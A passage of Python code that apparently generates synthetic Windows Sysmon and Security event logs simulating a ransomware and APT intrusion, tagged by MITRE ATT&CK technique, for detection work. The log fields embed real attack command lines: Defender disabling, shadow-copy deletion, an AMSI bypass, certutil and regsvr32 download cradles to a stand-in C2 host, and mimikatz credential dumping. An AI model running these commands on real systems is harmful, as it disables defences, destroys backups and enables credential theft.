                    "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "TokenElevationType": "%%1937",
                    "ProcessId": f"0x{context.parent_pid:X}" if context.parent_pid else "0x0",
                    "CommandLine": 'powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true"',
                    "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-500",
                    "TargetUserName": context.username,
                    "TargetDomainName": context.user_domain,
                    "TargetLogonId": "0x3E7",
                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "MandatoryLabel": "S-1-16-12288",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1562.001",
            host=host.short_name,
            log_data=security_log,
            comment="Disable Windows Defender (Security)",
        )

        # PowerShell ScriptBlock logging - Event 4104
        self.timestamp_gen.next()
        scriptblock_log = {
            "winlog": {
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "event_id": 4104,
                "provider_name": "Microsoft-Windows-PowerShell",
                "computer_name": context.hostname,
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true",
                    "ScriptBlockId": context.guid,
                    "Path": "",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1562.001",
            host=host.short_name,
            log_data=scriptblock_log,
            comment="Disable Windows Defender (PowerShell ScriptBlock)",
        )

    def _create_shadow_delete_log(self, host: HostConfig) -> None:
        """Create shadow copy deletion log with paired Sysmon + Windows Security events."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Sysmon Event 1 - Process Create
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\vssadmin.exe",
                    "CommandLine": "vssadmin.exe delete shadows /all /quiet",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "Hashes": "SHA256=9B7C7C0CDEAA3F26B9D1A0CAFE1234567890ABCDEF1234567890ABCDEF123456",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentCommandLine": "cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1490",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Delete shadow copies (Sysmon)",
        )

        # Windows Security Event 4688 - Process Creation
        self.timestamp_gen.next()
        security_log = {
            "winlog": {
                "channel": "Security",
                "event_id": 4688,
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": context.hostname,
                "event_data": {
                    "SubjectUserSid": "S-1-5-18",
                    "SubjectUserName": "SYSTEM",
                    "SubjectDomainName": "NT AUTHORITY",
                    "SubjectLogonId": "0x3E7",
                    "NewProcessId": f"0x{context.pid:X}",
                    "NewProcessName": "C:\\Windows\\System32\\vssadmin.exe",
                    "TokenElevationType": "%%1936",
                    "ProcessId": f"0x{context.parent_pid:X}" if context.parent_pid else "0x0",
                    "CommandLine": "vssadmin.exe delete shadows /all /quiet",
                    "TargetUserSid": "S-1-5-18",
                    "TargetUserName": "SYSTEM",
                    "TargetDomainName": "NT AUTHORITY",
                    "TargetLogonId": "0x3E7",
                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "MandatoryLabel": "S-1-16-16384",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1490",
            host=host.short_name,
            log_data=security_log,
            comment="Delete shadow copies (Security)",
        )

    def _create_encryption_log(self, host: HostConfig) -> None:
        """Create ransomware encryption log with paired Sysmon + Windows Security events."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        ext = ".encrypted"
        if self.engagement.ransomware:
            ext = self.engagement.ransomware.encryption_extension

        # Sysmon Event 1 - Ransomware process creation
        sysmon_process_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\ransomware.exe",
                    "CommandLine": f"ransomware.exe --encrypt --path C:\\Users\\{context.username}\\Documents",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "Hashes": "SHA256=BADCAFE0DEADBEEF1234567890ABCDEF1234567890ABCDEF1234567890ABCDEF",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentCommandLine": "cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1486",
            host=host.short_name,
            log_data=sysmon_process_log,
            comment="Ransomware process execution (Sysmon)",
        )

        # Windows Security Event 4688 - Process Creation
        self.timestamp_gen.next()
        security_log = {
            "winlog": {
                "channel": "Security",
                "event_id": 4688,
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": context.hostname,
                "event_data": {
                    "SubjectUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
                    "SubjectUserName": context.username,
                    "SubjectDomainName": context.user_domain,
                    "SubjectLogonId": "0x3E7",
                    "NewProcessId": f"0x{context.pid:X}",
                    "NewProcessName": "C:\\Users\\Public\\ransomware.exe",
                    "TokenElevationType": "%%1937",
                    "ProcessId": f"0x{context.parent_pid:X}" if context.parent_pid else "0x0",
                    "CommandLine": f"ransomware.exe --encrypt --path C:\\Users\\{context.username}\\Documents",
                    "TargetUserSid": "S-1-5-21-1234567890-1234567890-1234567890-1001",
                    "TargetUserName": context.username,
                    "TargetDomainName": context.user_domain,
                    "TargetLogonId": "0x3E7",
                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "MandatoryLabel": "S-1-16-12288",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1486",
            host=host.short_name,
            log_data=security_log,
            comment="Ransomware process execution (Security)",
        )

        # Sysmon Event 11 - File created (encrypted file)
        self.timestamp_gen.next()
        sysmon_file_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 11,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\ransomware.exe",
                    "TargetFilename": f"C:\\Users\\{context.username}\\Documents\\important{ext}",
                    "CreationUtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "User": f"{context.user_domain}\\{context.username}",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1486",
            host=host.short_name,
            log_data=sysmon_file_log,
            comment="File encryption (ransomware)",
        )

    def _create_archive_log(self, host: HostConfig) -> None:
        """Create archive/collection log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        log_data = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Program Files\\7-Zip\\7z.exe",
                    "CommandLine": '7z.exe a -p"exfil2026" C:\\Users\\Public\\data.7z C:\\Users\\*\\Documents\\*',
                    "User": f"{context.user_domain}\\{context.username}",
                    "ParentProcessGuid": parent_guid,
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="collection",
            technique="T1560.001",
            host=host.short_name,
            log_data=log_data,
            comment="Archive data for exfiltration",
        )

    def _create_exfil_log(self, host: HostConfig) -> None:
        """Create exfiltration log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        log_data = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\curl.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": host.ip,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIp": context.c2_ip or "198.51.100.50",
                    "DestinationHostname": "transfer.sh",
                    "DestinationPort": "443",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="exfiltration",
            technique="T1567.002",
            host=host.short_name,
            log_data=log_data,
            comment="Exfiltration to cloud storage",
        )

    def _create_c2_beacon_log(self, host: HostConfig) -> None:
        """Create C2 beacon log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        log_data = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": host.ip,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIp": context.c2_ip or "203.0.113.50",
                    "DestinationHostname": context.c2_domain or "update-cdn.com",
                    "DestinationPort": str(context.c2_port or 443),
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="command-and-control",
            technique="T1071.001",
            host=host.short_name,
            log_data=log_data,
            comment="C2 beacon callback",
        )

    # ============================================================
    # Ransomware Impact - Additional Methods
    # ============================================================

    def _create_wmic_shadow_delete_log(self, host: HostConfig) -> None:
        """Create WMIC shadow copy deletion log (alternative to vssadmin)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Sysmon Event 1 - WMIC Process Create
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                    "CommandLine": "wmic shadowcopy delete /nointeractive",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": "NT AUTHORITY\\SYSTEM",
                    "IntegrityLevel": "System",
                    "Hashes": "SHA256=3B7C3E7F8A9B0C1D2E3F4A5B6C7D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    "ParentCommandLine": "cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1490",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Delete shadow copies via WMIC (Sysmon)",
        )

        # Windows Security Event 4688
        self.timestamp_gen.next()
        security_log = {
            "winlog": {
                "channel": "Security",
                "event_id": 4688,
                "provider_name": "Microsoft-Windows-Security-Auditing",
                "computer_name": context.hostname,
                "event_data": {
                    "SubjectUserSid": "S-1-5-18",
                    "SubjectUserName": "SYSTEM",
                    "SubjectDomainName": "NT AUTHORITY",
                    "SubjectLogonId": "0x3E7",
                    "NewProcessId": f"0x{context.pid:X}",
                    "NewProcessName": "C:\\Windows\\System32\\wbem\\WMIC.exe",
                    "TokenElevationType": "%%1936",
                    "ProcessId": f"0x{context.parent_pid:X}" if context.parent_pid else "0x0",
                    "CommandLine": "wmic shadowcopy delete /nointeractive",
                    "TargetUserSid": "S-1-5-18",
                    "TargetUserName": "SYSTEM",
                    "TargetDomainName": "NT AUTHORITY",
                    "TargetLogonId": "0x3E7",
                    "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                    "MandatoryLabel": "S-1-16-16384",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="impact",
            technique="T1490",
            host=host.short_name,
            log_data=security_log,
            comment="Delete shadow copies via WMIC (Security)",
        )

    def _create_bcdedit_recovery_disable_log(self, host: HostConfig) -> None:
        """Create bcdedit recovery disable log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        commands = [
            ("bcdedit /set {default} recoveryenabled No", "Disable Windows recovery"),
            ("bcdedit /set {default} bootstatuspolicy ignoreallfailures", "Ignore boot failures"),
        ]

        for cmd, comment in commands:
            sysmon_log = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 1,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "Image": "C:\\Windows\\System32\\bcdedit.exe",
                        "CommandLine": cmd,
                        "CurrentDirectory": "C:\\Windows\\System32\\",
                        "User": "NT AUTHORITY\\SYSTEM",
                        "IntegrityLevel": "System",
                        "ParentProcessGuid": parent_guid,
                        "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="impact",
                technique="T1490",
                host=host.short_name,
                log_data=sysmon_log,
                comment=f"{comment} (Sysmon)",
            )
            self.timestamp_gen.next()

            # Security event
            security_log = {
                "winlog": {
                    "channel": "Security",
                    "event_id": 4688,
                    "provider_name": "Microsoft-Windows-Security-Auditing",
                    "computer_name": context.hostname,
                    "event_data": {
                        "SubjectUserSid": "S-1-5-18",
                        "SubjectUserName": "SYSTEM",
                        "SubjectDomainName": "NT AUTHORITY",
                        "SubjectLogonId": "0x3E7",
                        "NewProcessId": f"0x{context.pid:X}",
                        "NewProcessName": "C:\\Windows\\System32\\bcdedit.exe",
                        "TokenElevationType": "%%1936",
                        "ProcessId": f"0x{context.parent_pid:X}" if context.parent_pid else "0x0",
                        "CommandLine": cmd,
                        "TargetUserSid": "S-1-5-18",
                        "TargetUserName": "SYSTEM",
                        "TargetDomainName": "NT AUTHORITY",
                        "TargetLogonId": "0x3E7",
                        "ParentProcessName": "C:\\Windows\\System32\\cmd.exe",
                        "MandatoryLabel": "S-1-16-16384",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="impact",
                technique="T1490",
                host=host.short_name,
                log_data=security_log,
                comment=f"{comment} (Security)",
            )
            self.timestamp_gen.next()

    def _create_stop_services_log(self, host: HostConfig) -> None:
        """Create service stop logs for backup and security services."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        services = [
            ("vss", "Volume Shadow Copy"),
            ("sql", "SQL Server"),
            ("svc$", "Backup services"),
            ("memtas", "MemSQL"),
            ("mepocs", "Sophos"),
            ("veeam", "Veeam Backup"),
            ("backup", "Windows Backup"),
        ]

        for svc, desc in services:
            sysmon_log = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 1,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "Image": "C:\\Windows\\System32\\net.exe",
                        "CommandLine": f"net stop {svc} /y",
                        "CurrentDirectory": "C:\\Windows\\System32\\",
                        "User": "NT AUTHORITY\\SYSTEM",
                        "IntegrityLevel": "System",
                        "ParentProcessGuid": parent_guid,
                        "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="impact",
                technique="T1489",
                host=host.short_name,
                log_data=sysmon_log,
                comment=f"Stop {desc} service",
            )
            self.timestamp_gen.next()

    def _create_process_termination_log(self, host: HostConfig) -> None:
        """Create process termination logs for security/backup processes."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        processes = [
            "msmpeng.exe",      # Windows Defender
            "savservice.exe",   # Sophos
            "ccsvchst.exe",     # Symantec
            "avgnt.exe",        # Avira
            "avastsvc.exe",     # Avast
            "sqlservr.exe",     # SQL Server
            "oracle.exe",       # Oracle DB
            "vmware-vmx.exe",   # VMware
        ]

        for proc in processes:
            sysmon_log = {
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": 1,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "computer_name": context.hostname,
                    "event_data": {
                        "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                        "ProcessGuid": context.guid,
                        "ProcessId": str(context.pid),
                        "Image": "C:\\Windows\\System32\\taskkill.exe",
                        "CommandLine": f"taskkill /f /im {proc}",
                        "CurrentDirectory": "C:\\Windows\\System32\\",
                        "User": "NT AUTHORITY\\SYSTEM",
                        "IntegrityLevel": "System",
                        "ParentProcessGuid": parent_guid,
                        "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                        "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                    },
                },
                "agent": {"name": context.agent_name, "id": context.agent_id},
            }

            self._add_log(
                phase="defense-evasion",
                technique="T1562.001",
                host=host.short_name,
                log_data=sysmon_log,
                comment=f"Kill process: {proc}",
            )
            self.timestamp_gen.next()

    # ============================================================
    # APT/Stealth Techniques
    # ============================================================

    def _create_amsi_bypass_log(self, host: HostConfig) -> None:
        """Create AMSI bypass PowerShell log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # PowerShell ScriptBlock with AMSI bypass
        scriptblock_log = {
            "winlog": {
                "channel": "Microsoft-Windows-PowerShell/Operational",
                "event_id": 4104,
                "provider_name": "Microsoft-Windows-PowerShell",
                "computer_name": context.hostname,
                "event_data": {
                    "MessageNumber": "1",
                    "MessageTotal": "1",
                    "ScriptBlockText": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
                    "ScriptBlockId": context.guid,
                    "Path": "",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1562.001",
            host=host.short_name,
            log_data=scriptblock_log,
            comment="AMSI bypass attempt",
        )

    def _create_certutil_download_log(self, host: HostConfig) -> None:
        """Create certutil download cradle log (LOLBin)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        c2_url = f"http://{context.c2_domain or 'update-cdn.com'}/payload.exe"

        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\certutil.exe",
                    "CommandLine": f"certutil -urlcache -split -f {c2_url} C:\\Users\\Public\\update.exe",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="command-and-control",
            technique="T1105",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Certutil download cradle (LOLBin)",
        )

        # Network connection
        self.timestamp_gen.next()
        network_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 3,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\certutil.exe",
                    "User": f"{context.user_domain}\\{context.username}",
                    "Protocol": "tcp",
                    "Initiated": "true",
                    "SourceIp": host.ip,
                    "SourcePort": str(random.randint(49152, 65535)),
                    "DestinationIp": context.c2_ip or "203.0.113.50",
                    "DestinationHostname": context.c2_domain or "update-cdn.com",
                    "DestinationPort": "80",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="command-and-control",
            technique="T1105",
            host=host.short_name,
            log_data=network_log,
            comment="Certutil network connection",
        )

    def _create_bitsadmin_download_log(self, host: HostConfig) -> None:
        """Create bitsadmin download log (LOLBin)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        c2_url = f"http://{context.c2_domain or 'update-cdn.com'}/stage2.exe"

        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\bitsadmin.exe",
                    "CommandLine": f"bitsadmin /transfer job /download /priority high {c2_url} C:\\Users\\Public\\stage2.exe",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="command-and-control",
            technique="T1105",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Bitsadmin download (LOLBin)",
        )

    def _create_mshta_execution_log(self, host: HostConfig) -> None:
        """Create mshta execution log (LOLBin)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        c2_url = f"http://{context.c2_domain or 'update-cdn.com'}/payload.hta"

        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\mshta.exe",
                    "CommandLine": f"mshta {c2_url}",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "Medium",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="execution",
            technique="T1218.005",
            host=host.short_name,
            log_data=sysmon_log,
            comment="MSHTA execution (LOLBin)",
        )

    def _create_rundll32_execution_log(self, host: HostConfig) -> None:
        """Create rundll32 execution log for DLL side-loading."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\rundll32.exe",
                    "CommandLine": "rundll32.exe C:\\Users\\Public\\payload.dll,DllMain",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "High",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1218.011",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Rundll32 DLL execution",
        )

    def _create_regsvr32_execution_log(self, host: HostConfig) -> None:
        """Create regsvr32 execution log (Squiblydoo)."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        c2_url = f"http://{context.c2_domain or 'update-cdn.com'}/payload.sct"

        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Windows\\System32\\regsvr32.exe",
                    "CommandLine": f"regsvr32 /s /n /u /i:{c2_url} scrobj.dll",
                    "CurrentDirectory": "C:\\Windows\\System32\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "Medium",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="defense-evasion",
            technique="T1218.010",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Regsvr32 Squiblydoo attack",
        )

    # ============================================================
    # Credential Theft Techniques
    # ============================================================

    def _create_mimikatz_sekurlsa_log(self, host: HostConfig) -> None:
        """Create Mimikatz sekurlsa::logonpasswords log."""
        parent_guid = self.guid_registry.get_current_process(host.short_name)
        context = self._get_render_context(host, parent_guid=parent_guid)

        # Sysmon Event 1 - Mimikatz execution
        sysmon_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 1,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "UtcTime": context.timestamp.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
                    "ProcessGuid": context.guid,
                    "ProcessId": str(context.pid),
                    "Image": "C:\\Users\\Public\\mimikatz.exe",
                    "CommandLine": "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit",
                    "CurrentDirectory": "C:\\Users\\Public\\",
                    "User": f"{context.user_domain}\\{context.username}",
                    "IntegrityLevel": "System",
                    "Hashes": "SHA256=912CE59CBE68A3E5C9D6E2B9B1C4D5A6E7F8B9C0D1E2F3A4B5C6D7E8F9A0B1C2",
                    "ParentProcessGuid": parent_guid,
                    "ParentProcessId": str(context.parent_pid) if context.parent_pid else "",
                    "ParentImage": "C:\\Windows\\System32\\cmd.exe",
                },
            },
            "agent": {"name": context.agent_name, "id": context.agent_id},
        }

        self._add_log(
            phase="credential-access",
            technique="T1003.001",
            host=host.short_name,
            log_data=sysmon_log,
            comment="Mimikatz sekurlsa::logonpasswords",
        )

        # Sysmon Event 10 - LSASS access
        self.timestamp_gen.next()
        lsass_log = {
            "winlog": {
                "channel": "Microsoft-Windows-Sysmon/Operational",
                "event_id": 10,
                "provider_name": "Microsoft-Windows-Sysmon",
                "computer_name": context.hostname,
                "event_data": {
                    "RuleName": "technique_id=T1003,technique_name=Credential Dumping",
